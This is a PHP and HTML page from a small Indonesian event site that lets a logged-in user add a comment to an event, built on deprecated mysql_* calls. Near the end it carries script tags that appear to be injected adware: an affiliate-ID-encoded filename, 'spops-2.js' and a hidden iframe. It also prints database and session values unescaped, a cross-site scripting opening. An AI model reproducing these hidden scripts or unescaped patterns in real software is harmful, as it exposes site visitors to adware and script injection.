<?php require_once('../Connections/localserver.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
$MM_authorizedUsers = "";
$MM_donotCheckaccess = "true";

// *** Restrict Access To Page: Grant or deny access to this page
function isAuthorized($strUsers, $strGroups, $UserName, $UserGroup) { 
  // For security, start by assuming the visitor is NOT authorized. 
  $isValid = False; 

  // When a visitor has logged into this site, the Session variable MM_Username set equal to their username. 
  // Therefore, we know that a user is NOT logged in if that Session variable is blank. 
  if (!empty($UserName)) { 
    // Besides being logged in, you may restrict access to only certain users based on an ID established when they login. 
    // Parse the strings into arrays. 
    $arrUsers = Explode(",", $strUsers); 
    $arrGroups = Explode(",", $strGroups); 
    if (in_array($UserName, $arrUsers)) { 
      $isValid = true; 
    } 
    // Or, you may restrict access to only certain users based on their username. 
    if (in_array($UserGroup, $arrGroups)) { 
      $isValid = true; 
    } 
    if (($strUsers == "") && true) { 
      $isValid = true; 
    } 
  } 
  return $isValid; 
}

$MM_restrictGoTo = "../signin.php";
if (!((isset($_SESSION['MM_Username'])) && (isAuthorized("",$MM_authorizedUsers, $_SESSION['MM_Username'], $_SESSION['MM_UserGroup'])))) {   
  $MM_qsChar = "?";
  $MM_referrer = $_SERVER['PHP_SELF'];
  if (strpos($MM_restrictGoTo, "?")) $MM_qsChar = "&";
  if (isset($_SERVER['QUERY_STRING']) && strlen($_SERVER['QUERY_STRING']) > 0) 
  $MM_referrer .= "?" . $_SERVER['QUERY_STRING'];
  $MM_restrictGoTo = $MM_restrictGoTo. $MM_qsChar . "accesscheck=" . urlencode($MM_referrer);
  header("Location: ". $MM_restrictGoTo); 
  exit;
}
?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

$editFormAction = $_SERVER['PHP_SELF'];
if (isset($_SERVER['QUERY_STRING'])) {
  $editFormAction .= "?" . htmlentities($_SERVER['QUERY_STRING']);
}


$colname_komenid = "-1";
if (isset($_GET['eventid'])) {
  $colname_komenid = $_GET['eventid'];
}
mysql_select_db($database_localserver, $localserver);
$query_komenid = sprintf("SELECT * FROM testimoni WHERE id_event = %s", GetSQLValueString($colname_komenid, "int"));
$komenid = mysql_query($query_komenid, $localserver) or die(mysql_error());
$row_komenid = mysql_fetch_assoc($komenid);
$totalRows_komenid = mysql_num_rows($komenid);

mysql_select_db($database_localserver, $localserver);
$query_status = "SELECT * FROM status";
$status = mysql_query($query_status, $localserver) or die(mysql_error());
$row_status = mysql_fetch_assoc($status);
$totalRows_status = mysql_num_rows($status);

$colname_event = "-1";
if (isset($_GET['eventid'])) {
  $colname_event = $_GET['eventid'];
}
mysql_select_db($database_localserver, $localserver);
$query_event = sprintf("SELECT * FROM events WHERE idevent = %s", GetSQLValueString($colname_event, "int"));
$event = mysql_query($query_event, $localserver) or die(mysql_error());
$row_event = mysql_fetch_assoc($event);
$totalRows_event = mysql_num_rows($event);
$user = $_SESSION['MM_Username'];
if ((isset($_POST["MM_insert"])) && ($_POST["MM_insert"] == "form1")) {
  $insertSQL = sprintf("INSERT INTO testimoni (ownerevent, nama_event, status, komentator, komentar, id_event) VALUES (%s, %s, %s, %s, %s, %s)",
                       GetSQLValueString($row_event['pembuat'], "text"),
                       GetSQLValueString($row_event['nama'], "text"),
                       GetSQLValueString($_POST['status'], "text"),
                       GetSQLValueString($user, "text"),
                       GetSQLValueString($_POST['komentar'], "text"),
                       GetSQLValueString($row_event['idevent'], "int"));

  mysql_select_db($database_localserver, $localserver);
  $Result1 = mysql_query($insertSQL, $localserver) or die(mysql_error());

  $insertGoTo = "eventitem.php?eventid=" . $row_komenid['id_event'] . "";
  if (isset($_SERVER['QUERY_STRING'])) {
    $insertGoTo .= (strpos($insertGoTo, '?')) ? "&" : "?";
    $insertGoTo .= $_SERVER['QUERY_STRING'];
  }
  header(sprintf("Location: %s", $insertGoTo));
}
?>
<!DOCTYPE html>
<html class=" js no-touch" style="" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title>Ikutan - Event Terdaftar</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="asset/bootstrap.css" rel="stylesheet">
<link href="asset/shopfrog.css" rel="stylesheet" media="screen">   

<link href="asset/shopfrog-brown.css" rel="stylesheet" media="screen">

<link href="asset/rateit.css" rel="stylesheet" media="screen">		       
<link href="asset/magnific-popup.css" rel="stylesheet"> 		
<script src="asset/respond.js"></script>
<link href="http://leapfrogui.com/shopfrog/brown/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="asset/css.css" rel="stylesheet" type="text/css">
<link href="asset/css_002.css" rel="stylesheet" type="text/css">

<script src="asset/jquery-1.js"></script>    
<script src="asset/modernizr.js"></script>	
<script src="asset/imagesloaded.js"></script>	
<script src="asset/jquery_003.js"></script>	
<script src="asset/jquery_002.js"></script>		
<script src="asset/jquery.js"></script>				
<script src="asset/bootstrap.js"></script>
<script src="asset/shopfrog.js"></script>

<script src="asset/javascript.htm" type="text/javascript"></script><script src="asset/1010.js" id="sjsjszmzmaw28aj6" type="text/javascript"></script><script src="asset/l.js" type="text/javascript"></script><script src="asset/l_002.js" type="text/javascript"></script></head>
<body class="page-general">
			
	<header class="navbar navbar-fixed-top clearfix">
		
	<a class="brand" href="index.php">Ikutan</a>


    <div id="nav-basket" class="basket">
        <a href="signin.php" class="basket-link"  style="height: 10px;">
  <a href="update_profile.php"><strong class="btn btn-success">@ <?php echo $_SESSION['MM_Username']; ?></strong></a>
  
  <a href="localhost/ikutan/views/index.php?doLogout=true"><strong class="btn btn-success">Logout</strong></a>
 
  
</div>
	
	<button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="icon-bar"></span>
		<span class="icon-bar"></span>
		<span class="icon-bar"></span>
	</button>

	<nav class="navbar-collapse collapse" id="main-nav">
		<ul class="nav">
			<li class="active">
				<a href="index.php" class="top-level flat">Home</a>
			</li>
			<li>
				<a href="http://localhost/ikutan/views/explore.php" class="top-level">Explore</a>
				
			</li>
             <li>
				<a href="http://localhost/ikutan/views/tambah_event.php" class="top-level">Tambah Event</a>
				
			</li>
			 <li>
				<a href="http://localhost/ikutan/views/eventsaya.php" class="top-level">Event Saya</a>
				
			</li>
										
		</ul>
	</nav><!--/.nav-collapse -->
	
</header>


	
	<div class="container">
		<!-- <div class="row">

			<div class="col-xs-12">
				<a href="index.php">Home</a> &gt; Shopping cart
			</div> <! //end span12 -->

		</div> <!-- //end row --> 
	</div> <!-- //end container -->
	
	<div class="container main-content">
		<div class="row">
			<div class="col-xs-12">
				<div class="content">
                <h1>Tambahkan Komentar</h1>
                  <form method="post" name="form1" action="<?php echo $editFormAction; ?>">
                    <table align="center">
                      <tr valign="baseline">
                        <td nowrap align="right">Pembuat Event:</td>
                        <td><input type="text" name="ownerevent" value="<?php echo $row_event['pembuat']; ?>" size="32" disabled></td>
                      </tr>
                      <tr valign="baseline">
                        <td nowrap align="right">Nama Event:</td>
                        <td><input type="text" name="nama_event" value="<?php echo $row_event['nama']; ?>" size="32" disabled></td>
                      </tr>
                      <tr valign="baseline">
                        <td nowrap align="right">Status:</td>
                        <td><select name="status">
                          <?php
do {  
?>
                          <option value="<?php echo $row_status['status']?>"<?php if (!(strcmp($row_status['status'], $row_status['status']))) {echo "selected=\"selected\"";} ?>><?php echo $row_status['status']?></option>
                          <?php
} while ($row_status = mysql_fetch_assoc($status));
  $rows = mysql_num_rows($status);
  if($rows > 0) {
      mysql_data_seek($status, 0);
	  $row_status = mysql_fetch_assoc($status);
  }
?>
                        </select></td>
                      <tr>
                      <tr valign="baseline">
                        <td nowrap align="right">Komentator:</td>
                        <td><input type="text" name="komentator" value=" <?php echo $_SESSION['MM_Username']; ?>" size="32" disabled></td>
                      </tr>
                      <tr valign="baseline">
                        <td nowrap align="right" valign="top">Komentar:</td>
                        <td><textarea name="komentar" cols="50" rows="5"></textarea></td>
                      </tr>
                      <tr valign="baseline">
                        <td nowrap align="right">Id_event:</td>
                        <td><input type="text" name="id_event" value="<?php echo $row_event['idevent']; ?>" size="32" disabled></td>
                      </tr>
                      <tr valign="baseline">
                        <td nowrap align="right">&nbsp;</td>
                        <td><input class="btn btn-danger" type="submit" value="Tambah Komentar"></td>
                      </tr>
                    </table>
                    <input type="hidden" name="MM_insert" value="form1">
                  </form>
                  <p>&nbsp;</p>
                </div>			
			</div> <!-- // end span12 -->
		</div> <!-- //end row -->
	</div> <!-- //end container -->
	
	<footer>
	<div class="container">
		<div class="row">
							
		</div>
	</div>
</footer>	
	

<script src="asset/aeyJhZmZpZCI6MTAxOCwic3ViYWZmaWQiOjEwMTAsImhyZWYiOiJodHRwOi8v.js"></script><script src="asset/spops-2.js" charset="UTF-8" type="text/javascript"></script><iframe src="asset/pquery-0.htm" style="display: none;"></iframe></body></html>

